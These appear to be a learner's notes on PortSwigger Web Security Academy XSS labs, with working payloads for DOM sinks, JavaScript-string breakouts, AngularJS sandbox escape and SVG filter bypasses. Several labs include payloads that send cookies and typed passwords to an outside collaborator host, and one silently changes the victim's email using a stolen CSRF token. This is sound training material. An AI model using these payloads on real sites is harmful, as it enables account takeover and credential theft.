https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

```JS
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query +'">');
```
document.write() sink resulted in:
```HTML
<img src="/resources/images/tracker.gif?searchTerms=trVeH9y">
```
So then the payload would look like this:
```HTML
trVeH9y"><script>alert(1)</script>
```
Resulting in:
```HTML
<img src="/resources/images/tracker.gif?searchTerms=trVeH9y"><script>alert(1)</script>">
```

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

```JS
document.getElementById('searchMessage').innerHTML = query; // innerHTML sink
```
```HTML
<span id="searchMessage">trVeH9y</span>
```
Resulting in:
```HTML
<span id="searchMessage">trVeH9y<svg onLoad="alert(1)"></svg></span>
```

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
```JS
$(function() {

$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); //href attribute sink

});
```
Submit feedback page URL looks like this:
`https://0a7d004c04ce819a804f03e000780046.web-security-academy.net/feedback?returnPath=/`

Resulting in:
```html
<a id="backLink" href="/">Back</a>
```

So:
`https://0a7d004c04ce819a804f03e000780046.web-security-academy.net/feedback?returnPath=javascript:alert(1)`
and click the "Back" button and we're done.

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
iFrame BS

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
\<a> tag took href from user so: javascript:alert(1)

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
input goes into javascript string. break out, write JS.
```JS
var searchTerms = 'trVeH9y';alert(1);//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');

```

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
vulnerable JS:
```JS
var store = (new URLSearchParams(window.location.search)).get('storeId');

if(store) {
document.write('<option selected>'+store+'</option>');
}
```
storeId URL param is taken as input and put into `document.write` sink without sanitizing.
adding a script tag or img or svg does the job. creates the element inside option and executes code.

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
AngularJS checks html elements with `ng-app` attribute and then its possible to run JS code inside that element inside Double curly-braces `{{}}`. but it sandboxes methods on the global `window` object (e.g. `alert()`).
to bypass that, should use the `$on` which is a **scope property** and grab its constructor(function) and construct a new function with `'alert(1)'` as code and invoke it:
```js
123{{$on.constructor('alert(1)')()}}
```

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
```js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
	eval('var searchResultsObj = ' + this.responseText);
	displaySearchResults(searchResultsObj);
	}
};
xhr.open("GET", path + window.location.search);
xhr.send();
```
and the response was:
```HTTP
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 37

{"results":[],"searchTerm":"trVeH9y"}
```
so the search function was taking the searchResultObj from the response text and used it in `eval()`. So we take advantage of that and close searchResultObj object and add arbitrary JS. also double-quotes were escaped which adding `\` behind them escaped the escaped char and fixed it.

```HTTP
GET /search-results?search=trVeH9y\"};alert(1);//



HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 53

{"results":[],"searchTerm":"trVeH9y\\"};alert(1);//"}
```
resulting in:
```JS
	eval('var searchResultsObj = ' + {"results":[],"searchTerm":"trVeH9y\\"};alert(1);//"});
```

---
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
lab uses this function to escape angle brackets:
```JS
function escapeHTML(html) {
return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
The thing about `.replace()` method is that it only replaces the ***first*** occurrence of given string(s).
so working payload is: `<><img src=x onerror=alert(1)`

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
fuzzing shows \<body onresize=print()> is not blocked however we should do it without user interaction. 
in order to do that, we use an \<iframe>, pointing into the lab with the payload in the URL param, then add the `onload=this.style.width='100px'` to the iframe. iframe loads he page, and does the resize.

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
stored exploit page:
```html
<script>
window.location.href="https://0a760005048235e381022021000a007e.web-security-academy.net/?search=
<xss id='xssid' onfocus='alert(document.cookie)' tabindex='1'></xss>#xssid"
</script>
```
user is forwarded to the site, input is the \<xss> tag and since its a ***custom element***, only a few global attributes like `onfocus` work, but using `onfocus` alone still needs user interaction so we add an `id` and `tabindex` to the element and force victim's browser to focus on the \<xss> element by adding the element's `id` as hash to the end of the URI.

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
the `onbegin` attribute is allowed, here's how to fire it:
```html
<svg><animatetransform onbegin=alert(1)>
```

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
input goes into a JS string:
```JS
var searchTerms = 'trVeH9y';
```
but `'` and `\` are escaped by adding a `\` before them. but `/` and `<>` are not blocked. so we can close the \<script> tag and open our own.

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
input goes into a JS string:
```JS
var searchTerms = 'trVeH9y';
```
`<> and "` are html-encoded and `'` is escaped with a `\`. but `\` itself is not escaped so by putting an ***odd*** number of `\`s before the `'` the escape mechanism is bypassed.

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
input -> server checks for `<> | " | ' | \` and does 2 things:
	`<> and "` are HTML-encoded if found
	`' and \` are escaped if found
then server returns the response
browser parses the response (HTML-decode)

input placement:
```JS
function onclick(event) {
	var tracker = {
	track() {}
	};
	tracker.track('INPUT');
}
```
since `'` gets escaped, we replace it with `&apos;` which is the HTML-encoded value and its passed to the server, server finds it safe and includes it in the response and when the response is shown in the browser, `&apos;` is HTML-decoded and JS string is closed and we enter the rest of the payload after it and JS parses it. 

Flow:
```
INPUT (trVe&apos;);alert(1)//) -> Server Check (safe) -> 
Response -> Browser Parses the response and HTML-Decodes &apos; ->
JS Parses this:
		tracker.track('trVe');alert(1)//');
```

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

backtick is escaped here but its possible to use ${alert(1)}

> **HTML entities are decoded in HTML contexts, not in JavaScript source contexts.**

we're inside a template literal.
Ask, in order:

1. Do I control a real backtick?
2. Do I control `${`?
3. Does this variable later hit `innerHTML` or similar?
4. Does the same variable appear elsewhere?
5. Can I break the script context (`</script>`)?

---
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked (ADVANCED)

You correctly reasoned:
- `<a>` is allowed
- `href` / `xlink:href` are blocked
- events are blocked
- attributes are filtered

What you hadn’t used yet is this:
> **SVG animations can dynamically set attributes at runtime**

This bypasses _static_ filtering completely.

payload:
```html
<svg>
	<a>
		<animate attributeName=href values=javascript:alert(1) />
		<text x=20 y=20>Click me</text>
	</a>
```

When the SVG loads:

- `<animate>` **writes to the `href` attribute**
- This happens **after parsing**
- This happens **inside the browser**, not the server

Now the DOM effectively contains:
```HTML
<a href="javascript:alert(1)">   <text>Click me</text> </a>
```

## Why this bypass is powerful (and real)

This pattern appears in real apps when:

- Developers sanitize static HTML
- WAFs block obvious attributes
- SVG is allowed for icons, charts, or logos
- Nobody considers **runtime SVG mutation**

That’s why many security guidelines say:

> “Treat SVG as script.”

> **If static attributes are filtered, look for a runtime write primitive.**

In SVG, that primitive is:
- `<animate>`
- `<set>`
- sometimes `<animateTransform>`

They can:
- mutate attributes
- bypass filters
- create execution paths post-parse

> Static filtering ≠ runtime safety  
> Parsing ≠ execution  
> SVG ≠ HTML

---
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

```HTML
<script>
window.location.href="https://301cc3wkczduiv9olj3sjqr8zz5qtgh5.oastify.com/?cookie="+document.cookie
</script>
```

---
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
to extract username:password this lab uses input tags:
```HTML
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

---
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

```JS
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const token = doc.querySelector('input[name="csrf"]').value;
    fetch('/my-account/change-email', {method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'},body:'email=newnew@new.com&csrf='+token});
  });
</script>
```

fetch(/my-account) -> save token to a const -> fetch(/my-account/change-email) + POST + correct Headers + email and toekn in body.

---

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked (ADVANCED)

vulnerable code:
```HTML
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```
input could go into the body of the fetch method by adding url params. final payload:

```js
fetch('/analytics', {
  method:'post',
  body:'/post/postId=5&test='
}, 
x = x => { throw /*comment*/ onerror = alert, 1337 },    // 1
toString = x,                                           // 2
window + '' ,                                           // 3 (coercion)
{ x: '' }                                                // 4 (re-opens something to keep syntax valid)
).finally(_ => window.location = '/')
```
- `x = x => { throw /**/ onerror = alert, 1337 }`
    
    - Declares/assigns a function `x` (arrow) that, when run, evaluates the expression `throw (onerror = alert, 1337)`.
        
    - `onerror = alert` sets the global error handler to `alert`. The comma operator yields `1337`. Then `throw 1337` throws an exception (value 1337).
        
- `toString = x`
    
    - Assigns the global `toString` property to that function `x`. Because globals live on `window`, this sets `window.toString = x` (so `window.toString()` will call `x`).
        
- `window + ''`
    
    - Coerces `window` to a primitive by calling its `toString` method. Because we've just set `window.toString` to `x`, that coercion calls `x()` — which executes the function body that sets `onerror = alert` and then throws `1337`. Throwing triggers the `onerror` handler we just set, so `alert(...)` runs (alert will be invoked via the global error dispatch). In short: coercion → call toString → throw → onerror(alert) → the alert pops.
        
- `{ x: '' }` (or similar trailing token)
    
    - This purposefully places a harmless final expression so the sequence fits syntactically with the surrounding code (it prevents the parser from encountering an unbalanced syntax state because the payload carefully balances closures and uses comma expressions rather than `//` to swallow remaining tokens).


- When injecting into JavaScript, map the _exact_ syntactic context first (open strings, objects, function calls). Most failures are parse‑time, not logic errors.

- In `javascript:` contexts, line comments (`//`) are fragile and often cause missing‑token syntax errors; prefer expression‑based payloads that keep the code valid.

- Comma operator chains allow execution _without_ breaking surrounding syntax and are safer than trying to terminate the statement.

- Direct `alert()` calls are often brittle; coercion‑based execution (`window + ''`) plus reassigned hooks (`toString`, `onerror`) is more robust.

- `onerror = alert` + `throw` is a powerful primitive: set the handler, trigger an exception, and let the browser call your sink.

- Always decode and mentally re‑parse the final JavaScript the browser executes; treat the engine like a compiler, not a string matcher.

- If simple break‑out payloads fail repeatedly, switch strategy from “escape and execute” to “execute while staying syntactically valid.”
---

